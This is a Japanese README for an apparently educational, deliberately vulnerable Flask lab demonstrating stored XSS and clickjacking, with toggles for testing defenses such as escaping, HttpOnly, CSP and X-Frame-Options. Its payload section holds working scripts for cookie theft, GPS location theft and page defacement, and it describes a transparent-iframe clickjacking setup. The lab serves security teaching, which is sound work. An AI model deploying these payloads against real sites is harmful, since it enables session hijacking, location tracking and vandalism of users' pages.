# Stored XSS / Clickjacking 検証ラボ

🌐 **[Read this in English](README.en.md)** | 🇯🇵 日本語（このページ）

> **教育・許可された検証専用 / Authorized Testing & Education Only**

意図的に脆弱化した掲示板アプリを題材に、代表的な 2 種類の Web 攻撃をローカルのラボ環境で再現・観察し、**各対策の ON/OFF による効果の違い**をリアルタイムで確認するための学習用ツールです。

- **① Stored XSS（格納型クロスサイトスクリプティング）** — 投稿がエスケープされずに保存・出力される
- **② Clickjacking（クリックジャッキング / CJ）** — 透明な iframe を重ねてクリックを盗む

攻撃の再現以上に、**各対策を有効化して「攻撃がどのように失敗するようになるか」を確認する防御検証パートが本ツールの核心**です。

---

## ⚠️ 警告

- **自分が所有・管理するローカル／ラボ環境**、または**書面で許可を得た環境**でのみ実施してください。
- 第三者が運営するサイト・システムに対して無断でこの手法を使用することは、**不正アクセス禁止法などの法令違反**となります。
- 本アプリは意図的に脆弱です。**信頼できない共有ネットワークで起動しないでください**（既定の起動設定は `0.0.0.0:5000` で LAN に公開されます）。
- 本アプリは学習・検証専用であり、堅牢な認証・CSRF 対策・永続化 DB 等、実運用のセキュリティ対策は一切実装していません。
- リバースプロキシ等でインターネットに公開することは**絶対に行わないでください**。

---

## 目次

- [前提環境](#前提環境)
- [構成ファイル](#構成ファイル)
- [セットアップと起動](#セットアップと起動)
- [デモアカウントとロール](#デモアカウントとロール)
- [画面構成とルート一覧](#画面構成とルート一覧)
- [シナリオ 1: Stored XSS](#シナリオ-1-stored-xss)
- [シナリオ 2: クリックジャッキング](#シナリオ-2-クリックジャッキング)
- [対策設定（防御トグル）と検証手順](#対策設定防御トグルと検証手順)
- [Bot 会話シミュレーション](#bot-会話シミュレーション)
- [ペイロード集](#ペイロード集)
- [データの永続化とリセット](#データの永続化とリセット)
- [脆弱性の所在まとめ](#脆弱性の所在まとめ)
- [対策まとめ](#対策まとめ)
- [トラブルシューティング](#トラブルシューティング)

---

## 前提環境

| 項目 | 要件 |
|---|---|
| OS | Windows 10 / 11（本手順の前提）。macOS / Linux でも動作可 |
| Python | 3.8 以上（Flask 3.0 の動作要件に準拠） |
| 依存パッケージ | Flask（3.0 以上）＋ **gevent**（HTTPS 起動に必要）＋ **cryptography**（`pemcreator.py` での証明書発行に必要） |
| ブラウザ | 2 種類あると理想（例: Chrome と Firefox）。難しければ「通常ウィンドウ」＋「シークレット／プライベートウィンドウ」でも可 |
| ネットワーク | 外部通信不要。既定では HTTPS で LAN 内公開（同一マシンのみに限定する設定も可） |

> **なぜブラウザを 2 つ使うのか**：攻撃者役（一般ユーザー）と被害者役（管理者）で**別々のセッション Cookie** を持たせる必要があるためです。同一ブラウザの同一ウィンドウでは Cookie が共有され、攻撃者と被害者を分離できません。

---

## 構成ファイル

```
stored-xss-cj-poc/
├── app.py               # Flask 本体（ルート・攻撃再現・防御トグル・Bot）
├── requirements.txt     # 依存パッケージ（Flask + gevent + cryptography）
├── pemcreator.py        # 実行マシンのローカル IP に合わせた HTTPS 証明書を発行するスクリプト
├── cert.pem / key.pem   # HTTPS 用証明書（pemcreator.py が生成。リポジトリには含めない）
├── messages.json        # 掲示板の投稿（ファイルDB・永続化。実行時に自動生成）
├── loot.json            # /collector が受信した窃取データ（実行時に自動生成）
├── settings.json        # 防御トグルの状態（実行時に自動生成）
├── static/
│   ├── app.css          # 全ページ共通スタイル
│   ├── cj.js            # CJ コントロールパネル用スクリプト
│   ├── cj_stage.js      # CJ 攻撃ステージ用スクリプト
│   └── settings.js      # 対策設定トグルの送信スクリプト
└── templates/
    ├── login.html            # ログイン（デモアカウント一覧・ゲストログイン）
    ├── board.html            # 掲示板（脆弱な出力箇所）
    ├── profile.html          # プロフィール（CJ の攻撃対象・削除ボタンあり）
    ├── profile_embed.html    # nav なしプロフィール（iframe 埋め込み用）
    ├── settings.html         # 対策設定（防御トグル UI）
    ├── admin.html            # 管理パネル（統計・Bot管理・セッション監視）
    ├── dashboard.html        # 攻撃者ダッシュボード（窃取データ表示）
    ├── attacker_cj.html      # CJ コントロールパネル
    └── attacker_cj_stage.html # CJ 攻撃ステージ（デコイ + 透明 iframe）
```

> `cert.pem` / `key.pem` と `messages.json` / `loot.json` / `settings.json` は実行時に生成されるファイルのため、`.gitignore` でリポジトリから除外しています。

---

## セットアップと起動

### 1. 依存パッケージ

`app.py` の起動部は **gevent の WSGIServer で HTTPS 起動**します。必要な依存（Flask・gevent・cryptography）は `requirements.txt` にまとまっています。`cryptography` は次のステップの `pemcreator.py`（証明書発行）で使用します。

```bash
cd stored-xss-cj-poc
python3 -m venv venv && source venv/bin/activate   # 任意（Windows は venv\Scripts\activate）
pip install -r requirements.txt
```

`requirements.txt` の内容:

```
Flask>=3.0
gevent>=24.0
cryptography>=42.0
```

> **pip と Python の関係（混同しやすい点）**
> - pip では **Python 本体はインストールできません**。pip は Python に同梱されるパッケージ管理ツールです。
> - 一方、**Flask・gevent・cryptography は pip でインストールできます**。

### 2. 証明書の発行（pemcreator.py）

依存パッケージのインストールに続けて、**HTTPS 用の証明書を発行します**。`app.py` は起動時にカレントディレクトリの `cert.pem` / `key.pem` を読み込むため、起動前に用意しておく必要があります。

同梱の `pemcreator.py` は、**実行マシンの現在のローカル IP を自動検出**し、その IP（＋ `localhost` / `127.0.0.1`）を含む証明書を発行します。これにより、LAN 上の別端末（被害者役）から `https://<起動マシンの IP>:5000/` にアクセスしても証明書のホスト名不一致が起きにくくなります。

```bash
python pemcreator.py
```

実行すると検出した IP が表示され、カレントディレクトリに `cert.pem` と `key.pem` が生成されます。

```
検出したローカルIP: 192.168.xx.xx
完了！ cert.pem と key.pem を生成しました。
```

> **⚠ IP が変わったら証明書を再発行してください**
> Wi-Fi の切り替え・ルーターの再起動・別ネットワークへの移動などで**実行マシンの IP アドレスが変わった場合**、既存の証明書は古い IP のままとなり、LAN 越しのアクセスで警告や不一致が発生します。その際は、**フォルダ内の `cert.pem` と `key.pem` を削除してから `pemcreator.py` を再実行**して、新しい IP に合わせた証明書を発行し直してください。
>
> ```bash
> rm cert.pem key.pem          # Windows は del cert.pem key.pem
> python pemcreator.py
> ```

### 3. 起動

```bash
python app.py
```

起動に成功すると、コンソールに以下のバナーが表示されます。

```
========================================================================
Stored XSS PoC Demo -- 教育・許可された検証専用
インターネットに公開しないでください。
========================================================================
HTTPS 起動: https://127.0.0.1:5000
```

`pemcreator.py` で生成した `cert.pem` / `key.pem` を使い **HTTPS で `0.0.0.0:5000`（全インターフェース）** に待ち受けます。アクセス先（自己署名証明書のため警告が出ます）:

- `https://127.0.0.1:5000/` （同一マシンから。自動で /login へ）
- `https://<起動マシンのLAN IP>:5000/` （同一 LAN の別端末＝被害者役から）

> 証明書は `pemcreator.py` が実行マシンの IP に合わせて発行します（localhost / 127.0.0.1 / 実行マシンの IP 向け）。**IP が変わった場合は、フォルダ内の `cert.pem` / `key.pem` を削除して `pemcreator.py` を再実行**してください（→ [2. 証明書の発行](#2-証明書の発行pemcreatorpy)）。
>
> **停止方法**：コンソールで `Ctrl + C`。仮想環境を抜けるには `deactivate`。

### 4. Windows での詳細セットアップ

1. **コマンドプロンプトを「管理者として実行」で開く** — Windows キー →「cmd」→ 右クリック →［管理者として実行］。
2. **PoC フォルダへ移動**：`cd /d C:\Users\<ユーザー名>\Downloads\stored-xss-cj-poc`
3. **Python の確認**：`python --version`（3.8 以上なら OK）
4. **（未インストール時）Python の導入**：`winget install -e --id Python.Python.3.13`。完了後コマンドプロンプトを開き直し、［Add python.exe to PATH］にチェックが入っていることを確認。
5. **（任意）仮想環境**：`python -m venv venv` → `venv\Scripts\activate`
6. **依存パッケージ**：`pip install -r requirements.txt`
7. **証明書の発行**：`python pemcreator.py`（実行マシンの IP に合わせた `cert.pem` / `key.pem` を生成。IP が変わったら `del cert.pem key.pem` してから再実行）
8. **起動**：`python app.py`

### なぜ HTTPS なのか

Stored XSS のうち **GPS 位置情報の窃取（Geolocation API）は、セキュアコンテキスト（HTTPS または localhost）でしか動作しません**。LAN 上の別端末を被害者に見立てて GPS 窃取まで再現するために HTTPS で起動しています。

### ローカル限定にする場合

同一マシンのみで検証したい場合は、`app.py` 末尾を次の行に切り替えます。

```python
# HTTPS/LAN 起動をやめてローカル限定にする場合:
app.run(host="127.0.0.1", port=5000, debug=True)
```

※ この場合 GPS 窃取デモは localhost 扱いでのみ動作し、LAN 越しの被害者役では動きません。

---

## デモアカウントとロール

ログイン画面の一覧からユーザー名／パスワードをクリックすると自動入力＆コピーされます。

| ロール | ユーザー名 | パスワード | 接頭辞 | このデモでの立場・権限 |
|---|---|---|---|---|
| user（一般） | `user` | `User@2024` | `usr_` | **攻撃者役**。掲示板に悪意あるスクリプトを投稿する |
| admin（管理者） | `admin` | `Admin@2024` | `adm_` | **被害者役**。価値の高いセッションを持つため標的にされる。管理パネル・対策設定も利用可 |
| staff（スタッフ） | `staff` | `Staff@2024` | `stf_` | 補助的な第三のアカウント。管理パネル・対策設定を利用可 |
| guest（ゲスト） | （なし） | （なし） | `gst_` | 「ゲストで入る」で毎回ランダム発行。掲示板のみ |

- ロールは**セッショントークンの接頭辞**（`adm_` / `stf_` / `usr_` / `gst_`）で判定されます。
- **管理パネル・対策設定は admin / staff のみ**アクセスできます（user / guest はリダイレクト）。
- これらのアカウントとパスワードはこのローカル学習ラボ専用のデモ値です。本番環境や実在のサービスでは絶対に使い回さないでください。

---

## 画面構成とルート一覧

このラボは**「サイト側」**と**「攻撃者側」**の 2 系統に分かれます。攻撃者側ページはサイト側ナビからはリンクされておらず、攻撃者が URL を直接開いてアクセスします。攻撃者側ページどうしは上部ナビで相互リンクしています。

| メソッド | パス | 役割 | アクセス方法 |
|---|---|---|---|
| GET | `/` | /login へリダイレクト | 起動後に URL を開く |
| GET/POST | `/login` | ログイン | サイト側ナビ／起動時 |
| POST | `/guest-login` | ゲスト用ランダムトークン発行 | ログイン画面のボタン |
| GET/POST | `/board` | 掲示板（**脆弱性の発火点**）／投稿 | サイト側ナビ／ログイン後に自動遷移 |
| POST | `/collector` | 窃取データの受信口（画面なし） | ペイロードが自動送信（手動不要） |
| GET | `/attacker-dashboard` | 攻撃者ダッシュボード（窃取データ表示） | **攻撃者が URL を直接開く** |
| GET | `/attacker-cj` | CJ コントロールパネル | 攻撃者ダッシュボードのナビから |
| GET | `/attacker-cj/stage` | CJ 攻撃ステージ（デコイ + 透明 iframe） | コントロールパネル／被害者用 URL |
| GET/POST | `/settings` | 対策設定（防御トグル） | サイト側ナビ（admin / staff のみ） |
| GET | `/profile` | プロフィール（**CJ 攻撃対象**・削除） | サイト側ナビ（要ログイン） |
| POST | `/profile/delete` | アカウント削除 | プロフィールの削除ボタン |
| GET | `/profile/embed` | nav なしプロフィール（iframe 用） | ステージが内部的に読み込む |
| GET | `/admin` | 管理パネル（統計・Bot・セッション） | サイト側ナビ（admin / staff のみ） |
| POST | `/bot/start` 他 | Bot 会話の開始／停止／破棄 | 管理パネルのボタン（admin / staff） |
| GET | `/reset` | 投稿・窃取データ・Bot・削除状態を初期化 | ナビの［リセット］／URL 直打ち |

---

## シナリオ 1: Stored XSS

### 脆弱性の所在

- **出力（board.html）**：投稿本文を `{{ m.body|safe }}` として出力し、Jinja2 の自動エスケープを無効化。投稿内の `<script>` がブラウザで解釈・実行されます。
- **Cookie（app.py の login / guest_login）**：セッション Cookie に `HttpOnly` を付けていないため、`document.cookie` から JavaScript で読み取れます。

### 手順

1. **攻撃者役でログイン**：ブラウザ A で `https://127.0.0.1:5000/login` を開き、`user / User@2024` でログイン → /board へ遷移。
2. **被害者役でログイン**：ブラウザ B（別ブラウザ／シークレット）で同じ URL を開き、`admin / Admin@2024` でログイン → /board へ遷移。
   - ✅ この時点で A と B は別々の session Cookie を持ちます。掲示板上部のログイン中ユーザー表示で確認できます。
3. **攻撃者ダッシュボードを開く**：攻撃者のブラウザで `https://127.0.0.1:5000/attacker-dashboard` を別タブで直接開いておきます。
4. **攻撃ペイロードを投稿（ブラウザ A）**：まず動作確認用（9-1）で `alert(1)` が出れば脆弱と確認。［リセット］後、**統合ペイロード（9-6）** を投稿。
5. **被害者がページを閲覧（ブラウザ B）**：掲示板を再読み込みすると、表示した瞬間にペイロードが実行されます。
   - GPS 許可ダイアログで**許可**すると座標も窃取（拒否しても Cookie と IP は送信）。
   - 直後にページが「⚠ This site has been hacked ⚠」に改ざんされます。
   - ✅ 被害者は「掲示板を見ただけ」で被害に遭う — これが Stored XSS の受動的攻撃としての恐ろしさです。
6. **窃取結果を確認**：攻撃者ダッシュボードを再読み込みし、Cookie（`session=adm_...`）・IP・User-Agent・GPS 座標・取得日時が記録されていることを確認。

🎯 **到達目標**：得られた `adm_` トークンを攻撃者ブラウザの session Cookie に差し替えれば管理者になりすませる（セッションハイジャック）という被害を理解できれば成功です。

### Stored XSS の 4 つの実害

| # | 実害 | 仕組み |
|---|---|---|
| 1 | セッション Cookie 窃取（セッションハイジャック） | `document.cookie` を攻撃者サーバー（/collector）へ送信 |
| 2 | 被害者 IP の記録 | /collector へのアクセスログ（`request.remote_addr`）から取得 |
| 3 | GPS 位置情報の窃取 | Geolocation API（HTTPS + ユーザー許可が必要） |
| 4 | ページ改ざん（デフェイス） | `document.body.innerHTML` を書き換え |

---

## シナリオ 2: クリックジャッキング

透明な iframe に被害者サイトを重ね、デコイ（おとり）ページのボタンを押させることで、裏側の**アカウント削除ボタンを押させる**攻撃です。

### 攻撃対象

`/profile`（および nav なしの `/profile/embed`）にある「アカウントを削除する」ボタン。`POST /profile/delete` を送信し、ログイン中アカウントを削除します。

### 手順

1. 被害者役のブラウザで対象アカウント（例: `user`）にログインしておく。
2. 攻撃者役で**攻撃者ダッシュボードの上部ナビから「CJ コントロールパネル」を開く**。
3. スライダーで iframe の**透明度・縦位置（Y）・横位置（X）**を調整し、透明な削除ボタンをデコイの「当選を確認する」ボタンに重ねる。
   - プリセット「🔴 ステルス」で被害者視点（ほぼ透明）を再現。
   - プリセット「🟡 半透明確認」で iframe を透かして重なりを確認。
4. 検証方法は 2 通り。
   - **同一ブラウザ**：「⚔ 攻撃ステージを開く」→ 別ウィンドウが開き、スライダー操作が postMessage でリアルタイム反映。
   - **クロスブラウザ**：「📋 URL をコピー」で X/Y/透明度を埋め込んだ被害者用 URL を取得し、被害者役の別ブラウザで開く。
5. 被害者が「✔ 当選を確認する」を押す → 実際には透明 iframe 内の削除ボタンが押され、アカウントが削除される。
6. `/profile` を開くと「このアカウントは削除されました」と表示。`/reset` で復元できます。

### 仕組み（attacker_cj_stage.html）

- **Layer 1（デコイ）**：ギフト券当選風の偽ページ。`pointer-events: none` でクリックを受け取らない（位置合わせ用の見た目だけ）。
- **Layer 2（iframe）**：`/profile/embed` を `opacity: 0.05` / `z-index: 2` で重ね、**クリックはこの iframe が受け取る**。`transform: translate(x, y)` で削除ボタンをデコイボタンの真下に合わせる。
- 対策（`X-Frame-Options: DENY`）が有効な場合、iframe の読み込みがブラウザに拒否され、「🛡 X-Frame-Options: DENY」オーバーレイが表示されて攻撃が無効化されます。

---

## 対策設定（防御トグル）と検証手順

`/settings`（admin / staff のみ）で 6 種類の対策を個別に ON/OFF でき、状態は `settings.json` に永続化されます。**すべてデフォルト OFF（＝脆弱な状態）**です。トグルは**クリックした瞬間に反映**されます（別途「保存」ボタンはありません）。

### 各対策と反映タイミング

| キー | 対策 | ON にすると | 反映タイミング |
|---|---|---|---|
| `escape` | 出力エスケープ | `<script>` がただの文字列として表示され実行されない（**根本対策**） | 次の投稿から |
| `sanitize` | 入力サニタイズ（保存時に HTML タグ除去） | 投稿時点でタグが除去され、以後どう表示してもスクリプトが残らない | 次の投稿から |
| `httponly` | HttpOnly Cookie | `document.cookie` から読めず Cookie 窃取が空振り | トグル時に Cookie 即再発行 |
| `csp` | Content-Security-Policy（`script-src 'self'`） | インライン `<script>` の実行自体をブラウザが拒否（多層防御） | リロード直後 |
| `samesite_strict` | SameSite=Strict Cookie | 外部サイト起点のリクエストで Cookie を送らない | トグル時に Cookie 即再発行 |
| `x_frame_options` | X-Frame-Options: DENY（＋ nosniff） | iframe 埋め込みを拒否し、クリックジャッキングを無効化 | リロード直後 |

- CSP・X-Frame-Options は `app.py` の `@app.after_request`（`apply_security_headers`）で付与。
- HttpOnly・SameSite はログイン／ゲストログイン時、およびトグル変更時の Cookie 再発行で反映。
- サニタイズは投稿保存時、エスケープは掲示板の描画時に効きます。

### 検証の進め方（基本ループ）

各防御策について、以下を繰り返します。

1. ナビの［リセット］で投稿と窃取データを初期化する。
2. ［対策設定］で対象の防御策のトグルを **ON** にする（クリックで即反映）。
3. 攻撃者役（ブラウザ A）で再度ペイロードを投稿する（エスケープ／サニタイズは「次の投稿から反映」のため、ON 後に投稿し直すと効果が明確）。
4. 被害者役（ブラウザ B）で掲示板を再読み込みする。
5. `/attacker-dashboard` を開き、「窃取が失敗している／被害が発生していない」ことを確認する。
6. 確認後、その防御策のトグルを **OFF** に戻してから次の項目へ進む（単独の効果を切り分けるため）。

> **推奨する見せ方の順序**
> 1. まず `escape`（根本対策）→ スクリプトが「文字」になる様子
> 2. 次に `httponly` → 実行はされるが Cookie が盗めなくなる様子
> 3. 最後に `csp` → 実行自体がブロックされる多層防御
>
> 「①そもそも埋め込ませない ②盗ませない ③実行させない」という多層防御の考え方が体感できます。

---

## Bot 会話シミュレーション

掲示板を「実際に人が使っている板」に見せるための機能です（管理パネル `/admin` から操作）。

- 「▶ Bot 会話を開始」で、バックグラウンドスレッドが 7 種類の日本語会話スクリプトから 1 つをランダムに選び、**4〜9 秒間隔**で自然な投稿を続けます。
- 各 Bot は投稿前に掲示板を「閲覧」します。このとき**エスケープ・サニタイズが両方 OFF** かつ掲示板に XSS ペイロードが存在する場合、その Bot が「感染」したものとして、窃取データ（フェイクの GPS 付き）が `loot.json` に 1 件記録されます（1 Bot につき 1 回）。
- Bot 稼働中は掲示板が 3.5 秒ごとに自動リロードします。
- 管理パネルでは Bot に `[Bot]` ラベルが付きますが、**掲示板上では通常ユーザーと区別できません**。
- Bot のトークンは `usr_`（role: user）で発行されます。
- 会話スクリプトの登場人物・内容はすべて架空のもので、実在の人物とは関係ありません。

---

## ペイロード集

> ⚠️ 投稿フォームにそのまま貼り付けて使用します。**自分の管理下にあるこのラボ環境の掲示板に対してのみ**投稿してください。

### 9-1. 動作確認用

```html
<script>alert(1)</script>
```

### 9-2. Cookie 窃取

```html
<script>
fetch('/collector', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({cookie: document.cookie, url: location.href})
});
</script>
```

### 9-3. 被害者 IP の記録

上記の `fetch('/collector', ...)` が届いた時点で、サーバー側（`request.remote_addr`）が接続元 IP を自動記録します。クライアント JS から相手のグローバル IP を直接取得する標準 API は存在しないため、実務でも「攻撃者サーバーへのアクセスログから IP を得る」のが一般的な手口です。

### 9-4. GPS 位置情報の窃取（HTTPS + ユーザー許可が必要）

```html
<script>
navigator.geolocation.getCurrentPosition(function(pos) {
  fetch('/collector', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      cookie: document.cookie,
      url: location.href,
      gps: {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy}
    })
  });
}, function(err) {
  // 拒否された場合も cookie と IP だけ送る
  fetch('/collector', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({cookie: document.cookie, url: location.href})
  });
});
</script>
```

**Geolocation API の制約**

| 条件 | 結果 |
|---|---|
| HTTPS（または localhost）＋ 許可 | 高精度な緯度経度を取得 |
| HTTPS ＋ 拒否 | error callback → Cookie + IP のみ送信 |
| HTTP（localhost 以外） | `getCurrentPosition` 自体が呼ばれない |
| スマートフォン | GPS 利用で高精度 |
| PC（Wi-Fi） | IP ジオロケーション等で精度は低い |

### 9-5. ページ改ざん（デフェイス）

```html
<script>
document.title = 'HACKED';
document.body.innerHTML =
  '<h1 style="color:red;text-align:center;margin-top:20%">'
  + '⚠ This site has been hacked ⚠</h1>';
</script>
```

### 9-6. 統合ペイロード（4 つ同時に再現・メインシナリオ用）

9-2〜9-5 を 1 つにまとめた完成形です（新たな機能は加えていません）。

```html
<script>
(function() {
  function sendToCollector(gps) {
    fetch('/collector', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({cookie: document.cookie, url: location.href, gps: gps || null})
    }).then(function() {
      // 送信後にページ改ざん
      document.title = 'HACKED';
      document.body.innerHTML =
        '<h1 style="color:red;text-align:center;margin-top:20%">'
        + '⚠ This site has been hacked ⚠</h1>';
    });
  }
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        sendToCollector({lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy});
      },
      function() { sendToCollector(null); } // 拒否時も Cookie + IP は送る
    );
  } else {
    sendToCollector(null);
  }
})();
</script>
```

---

## データの永続化とリセット

| ファイル | 内容 | 初期化方法 |
|---|---|---|
| `messages.json` | 掲示板の投稿 | `/reset` |
| `loot.json` | /collector が受信した窃取データ | `/reset` |
| `settings.json` | 防御トグルの状態 | ［対策設定］で全 OFF、または手動編集（`/reset` では消えません） |

| 操作 | 方法 |
|---|---|
| 投稿・窃取データの初期化 | ナビの［リセット］ボタン（または `/reset`） |
| Bot セッションのみ破棄 | 管理パネルの「Bot セッションをリセット」（`/bot/reset`） |
| アプリの停止 | コンソールで `Ctrl + C` |
| 仮想環境から抜ける | `deactivate` |

- ログイン済みセッション（`SESSIONS`）と削除済みアカウント（`DELETED_ACCOUNTS`）は**メモリ上**にあり、サーバー再起動でリセットされます。
- データ実体を完全に消したい場合は `messages.json` / `loot.json` を削除しても構いません。

---

## 脆弱性の所在まとめ

| 場所 | 問題のある実装 | 内容 |
|---|---|---|
| `templates/board.html` | `{{ m.body\|safe }}` | 自動エスケープを無効化。投稿内の `<script>` がそのまま実行される（escape ON で `{{ m.body }}` に切替） |
| `app.py` の `login()` / `guest_login()` | `set_cookie(..., httponly=False)` | セッション Cookie に HttpOnly が無く、`document.cookie` からトークンを読める（httponly ON で防御） |
| `templates/profile*.html` | フレーム防止ヘッダ無し（既定） | iframe 埋め込みが可能でクリックジャッキングが成立（x_frame_options ON で防御） |
| `app.py` の `ACCOUNTS` | パスワード平文保持 | デモ用の意図的な脆弱実装 |

---

## 対策まとめ

実運用での対策と、本ラボの対応トグルの対応関係です。

- **出力エスケープ**（`escape`）：テンプレートで `|safe` を使わず自動エスケープを効かせる。リッチテキストを許可する場合は bleach / DOMPurify 等でタグ・属性をホワイトリスト化。
- **HttpOnly Cookie**（`httponly`）：セッショントークンを JavaScript から読めなくする。
- **Content-Security-Policy**（`csp`）：`script-src 'self'` 等でインラインスクリプト実行を禁止し、エスケープ漏れがあっても被害を抑える多層防御にする。
- **SameSite / Secure 属性**（`samesite_strict`）：SameSite=Strict（または Lax）と、HTTPS 環境では Secure を併用する。
- **入力バリデーション / サニタイズ**（`sanitize`）：想定外の入力をサーバー側で拒否・除去する。
- **X-Frame-Options / frame-ancestors**（`x_frame_options`）：X-Frame-Options: DENY（または CSP の frame-ancestors 'none'）で iframe 埋め込みを禁止し、クリックジャッキングを防ぐ。

---

## トラブルシューティング

| 症状 | 原因・対処 |
|---|---|
| 起動時に `ModuleNotFoundError: gevent` | 依存が未導入。仮想環境を有効化した状態で `pip install -r requirements.txt` を実行 |
| `pemcreator.py` で `ModuleNotFoundError: cryptography` | 依存が未導入。仮想環境を有効化した状態で `pip install -r requirements.txt` を実行 |
| 起動時に `cert.pem` / `key.pem` が見つからない | 証明書が未発行。起動前に `python pemcreator.py` を実行して生成する |
| ブラウザで証明書警告が出る | 自己署名証明書のため正常。ラボ用途では警告を承知のうえ続行 |
| LAN 越しのアクセスで証明書のホスト名／IP が一致しない | 実行マシンの IP が変わった可能性大。フォルダ内の `cert.pem` / `key.pem` を削除し、`python pemcreator.py` を再実行して IP に合わせた証明書を発行し直す |
| alert が出ない／スクリプトが実行されない | escape または sanitize が ON になっていないか確認。ON なら OFF に戻し、**投稿し直す**（両者は「次の投稿から反映」） |
| ダッシュボードに Cookie が記録されない | httponly が ON だと `document.cookie` が空になる＝正しい防御動作 |
| ダッシュボードに何も出ない | 被害者役ブラウザで掲示板を再読み込みしたか、投稿が攻撃者役で行われているかを確認 |
| GPS 座標が取れない | 「拒否」した／PC で精度が低い／HTTP（localhost 以外）で開いている、のいずれか。HTTPS または localhost で再度「許可」を選ぶ |
| CJ の iframe が読み込まれない | x_frame_options が ON になっていないか確認（ON はクリックジャッキングが無効化された正しい状態） |
| 攻撃者と被害者の Cookie が同じになる | 同一ブラウザの同一ウィンドウで両方ログインしている。別ブラウザ or シークレットウィンドウを使う |
| `pip install` が失敗する | Python のバージョン（3.8 以上）と、仮想環境を有効化しているかを確認 |

---

## ライセンス・免責

本ソフトウェアは**学習・教育および許可された検証を目的とする**ものです。利用者は、自身が所有・管理する環境または書面で明示的に許可を得た環境でのみ使用する責任を負います。第三者のシステムへの無断使用は法令違反となり、作成者は一切の責任を負いません。

配布ライセンスについては [LICENSE](LICENSE)（MIT License）を参照してください。
